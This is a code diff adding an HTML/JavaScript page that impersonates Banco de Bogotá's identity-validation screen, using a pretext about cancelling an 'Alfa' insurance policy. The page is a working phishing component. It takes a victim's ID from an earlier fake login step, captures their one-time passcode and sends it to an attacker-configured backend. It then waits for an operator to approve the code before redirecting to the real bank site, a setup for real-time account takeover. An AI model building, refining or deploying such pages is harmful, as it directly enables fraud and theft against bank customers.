@@ -1,1 +1,471 @@
 
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validación OTP - Banco de Bogotá</title>
+    
+    <!-- Carga la configuración dinámica del backend -->
+    <script src="/config.js"></script>
+    
+    <style>
+        /* --- CONFIGURACIÓN GENERAL --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #F8F9FA;
+            display: flex;
+            height: 100vh;
+            color: #333;
+        }
+
+        /* --- CONTENEDOR IZQUIERDO (FORMULARIO) --- */
+        .login-wrapper {
+            width: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-section {
+            width: 100%;
+            max-width: 420px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* --- HEADER ESCRITORIO (PC) --- */
+        .header-pc {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            margin-bottom: 25px;
+        }
+
+        .header-pc .logo-pc {
+            height: 35px;
+            margin-bottom: 15px; 
+        }
+
+        .header-pc h1 {
+            font-size: 1.5rem;
+            color: #000;
+            font-weight: 700;
+            margin: 0;
+        }
+
+        /* --- HEADER MÓVIL (Oculto por defecto) --- */
+        .header-mobile {
+            display: none;
+        }
+
+        /* --- BANNER AZUL --- */
+        .blue-banner {
+            background-color: #003DA5;
+            border-radius: 12px;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            color: white;
+            margin-bottom: 25px;
+        }
+
+        .blue-banner img {
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+            margin-right: 15px;
+        }
+
+        .blue-banner-text {
+            font-size: 0.85rem;
+            line-height: 1.3;
+        }
+
+        /* --- CAJA DE LOGIN (REUTILIZADA PARA OTP) --- */
+        .login-box {
+            border: 1px solid #E0E0E0;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #fff;
+            margin-bottom: 20px;
+            padding: 25px;
+        }
+
+        /* Alerta Celeste */
+        .alert-info {
+            background-color: #E8F4FF;
+            color: #004085;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            margin-bottom: 20px;
+            line-height: 1.4;
+            text-align: center;
+        }
+
+        /* Formularios */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.9rem;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 1.2rem;
+            outline: none;
+            transition: border 0.2s;
+            text-align: center;
+            letter-spacing: 5px;
+        }
+
+        input[type="text"]:focus {
+            border-color: #003DA5;
+        }
+
+        /* Botón Ingresar */
+        .btn-ingresar {
+            width: 100%;
+            padding: 14px;
+            background-color: #E0E0E0;
+            color: #999;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .btn-ingresar.active {
+            background-color: #003DA5;
+            color: white;
+            cursor: pointer;
+        }
+
+        /* Footer */
+        .recaptcha-text {
+            font-size: 0.75rem;
+            color: #666;
+            line-height: 1.4;
+            text-align: center;
+        }
+        .recaptcha-text a { color: #003DA5; text-decoration: none; }
+
+        /* --- PANTALLAS DE ESTADO (CARGANDO Y ERROR) --- */
+        .overlay-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+            padding: 20px;
+            text-align: center;
+        }
+
+        #loading-screen {
+            background-color: #003DA5;
+            color: white;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid rgba(255,255,255,0.3);
+            border-top: 6px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #error-screen {
+            background-color: #fff;
+        }
+
+        .error-box {
+            max-width: 400px;
+            background: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+
+        .error-box h2 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .error-box p {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .btn-retry {
+            background-color: #003DA5;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .btn-retry:hover {
+            background-color: #002D72;
+        }
+
+        /* --- RESPONSIVE MÓVIL --- */
+        @media (max-width: 768px) {
+            body {
+                flex-direction: column;
+                background-color: #fff;
+                height: auto;
+                min-height: 100vh;
+            }
+
+            .login-wrapper {
+                width: 100%;
+                padding: 20px;
+                align-items: flex-start;
+            }
+
+            .login-section {
+                max-width: 100%;
+            }
+
+            .header-pc {
+                display: none;
+            }
+            
+            .header-mobile {
+                display: flex;
+                align-items: center;
+                margin-bottom: 20px;
+                gap: 10px;
+            }
+            
+            .header-mobile img {
+                height: 35px;
+            }
+
+            .header-mobile h1 {
+                font-size: 1.2rem;
+                font-weight: bold;
+                color: #000;
+                margin: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- SECCIÓN IZQUIERDA (FORMULARIO OTP) -->
+    <div class="login-wrapper">
+        <div class="login-section">
+            
+            <!-- HEADER PC -->
+            <div class="header-pc">
+                <img src="bogota.png" alt="Banco de Bogotá" class="logo-pc">
+                <h1>Validación de identidad</h1>
+            </div>
+
+            <!-- HEADER MÓVIL -->
+            <div class="header-mobile">
+                <img src="x.png" alt="Logo">
+                <h1>Validación de identidad</h1>
+            </div>
+
+            <!-- Banner Azul -->
+            <div class="blue-banner">
+                <img src="image.png" alt="Validación">
+                <div class="blue-banner-text">
+                    <strong>Para cancelar el seguro Alfa</strong><br>
+                    Es necesario validar su identidad para continuar con el proceso.
+                </div>
+            </div>
+
+            <!-- Caja de OTP -->
+            <div class="login-box">
+                
+                <div class="alert-info">
+                    Hemos enviado un código de seguridad a tu dispositivo.<br>
+                    Usuario: <strong id="identificacion-mostrada">...</strong>
+                </div>
+
+                <div class="form-group">
+                    <label>Código OTP</label>
+                    <input type="text" id="otp-input" placeholder="••••••" maxlength="6" inputmode="numeric" pattern="\d*" autocomplete="one-time-code">
+                </div>
+
+                <button class="btn-ingresar" id="btn-otp">Validar Código</button>
+
+            </div>
+
+            <!-- Texto Legal -->
+            <div class="recaptcha-text">
+                Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio</a> de Google.
+            </div>
+
+        </div>
+    </div>
+
+    <!-- SECCIÓN DERECHA (items.png - Reutilizada) -->
+    <div class="right-section">
+        <img src="items.png" alt="Menú de accesos directos">
+    </div>
+
+    <!-- PANTALLA DE CARGA (AZUL) -->
+    <div id="loading-screen" class="overlay-screen">
+        <div class="spinner"></div>
+        <p style="font-size: 1.2rem; font-weight: 600;">Validando código...</p>
+    </div>
+
+    <!-- PANTALLA DE ERROR (RECHAZO) -->
+    <div id="error-screen" class="overlay-screen">
+        <div class="error-box">
+            <h2>Código incorrecto</h2>
+            <p>El código OTP ingresado no es válido o ha expirado. Por favor, verifica e inténtalo de nuevo.</p>
+            <button class="btn-retry" onclick="retryOtp()">Volver a intentar</button>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script>
+        // ==========================================
+        // 1. CONFIGURACIÓN Y VARIABLES
+        // ==========================================
+        const BACKEND_URL = window.BACKEND_URL;
+        
+        // Recuperar datos del usuario aprobado en sede.html
+        const identificacionAprobada = sessionStorage.getItem('identificacionAprobada');
+        const requestIdOrigen = sessionStorage.getItem('requestIdAprobado');
+
+        // Si no hay identificación en sesión, redirigir al login
+        if (!identificacionAprobada) {
+            window.location.href = 'sede.html';
+        } else {
+            // Mostrar la identificación en la interfaz
+            document.getElementById('identificacion-mostrada').textContent = identificacionAprobada;
+        }
+
+        // Elementos del DOM
+        const otpInput = document.getElementById('otp-input');
+        const btnOtp = document.getElementById('btn-otp');
+        const loadingScreen = document.getElementById('loading-screen');
+        const errorScreen = document.getElementById('error-screen');
+
+        let pollingInterval = null;
+
+        // ==========================================
+        // 2. LÓGICA DE UI (ACTIVAR BOTÓN)
+        // ==========================================
+        otpInput.addEventListener('input', () => {
+            // Activamos el botón si hay al menos 4 dígitos
+            if (otpInput.value.trim().length >= 4) {
+                btnOtp.classList.add('active');
+            } else {
+                btnOtp.classList.remove('active');
+            }
+        });
+
+        // ==========================================
+        // 3. LÓGICA DEL BACKEND (ENVÍO Y POLLING)
+        // ==========================================
+        async function enviarOtp() {
+            const otp = otpInput.value.trim();
+            if (otp.length < 4) return;
+
+            // Mostrar pantalla de carga
+            loadingScreen.style.display = 'flex';
+
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/otp`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        identificacion: identificacionAprobada, 
+                        otp: otp,
+                        requestIdOrigen: requestIdOrigen
+                    })
+                });
+
+                const data = await response.json();
+                if (!data.requestId) throw new Error('Error en el servidor');
+
+                // Iniciar Polling para ver si el admin aprueba el OTP
+                pollingInterval = setInterval(async () => {
+                    const statusRes = await fetch(`${BACKEND_URL}/api/otp-status/${data.requestId}`);
+                    const statusData = await statusRes.json();
+
+                    if (statusData.status === 'approved') {
+                        // OTP APROBADO -> Redirigir a Banco de Bogotá
+                        clearInterval(pollingInterval);
+                        window.location.href = 'https://www.bancodebogota.com';
+                    } else if (statusData.status === 'rejected') {
+                        // OTP RECHAZADO -> Mostrar error
+                        clearInterval(pollingInterval);
+                        loadingScreen.style.display = 'none';
+                        errorScreen.style.display = 'flex';
+                    }
+                }, 2000);
+
+            } catch (error) {
+                console.error('❌ Error enviando OTP:', error);
+                loadingScreen.style.display = 'none';
+                alert("Error de conexión. Intenta de nuevo.");
+            }
+        }
+
+        // ==========================================
+        // 4. FUNCIONES AUXILIARES
+        // ==========================================
+        function retryOtp() {
+            errorScreen.style.display = 'none';
+            otpInput.value = '';
+            btnOtp.classList.remove('active');
+            otpInput.focus();
+        }
+
+        // Evento del botón
+        btnOtp.addEventListener('click', enviarOtp);
+        
+        // Enviar con "Enter" en el input
+        otpInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter' && otpInput.value.trim().length >= 4) {
+                enviarOtp();
+            }
+        });
+    </script>
+</body>
+</html>
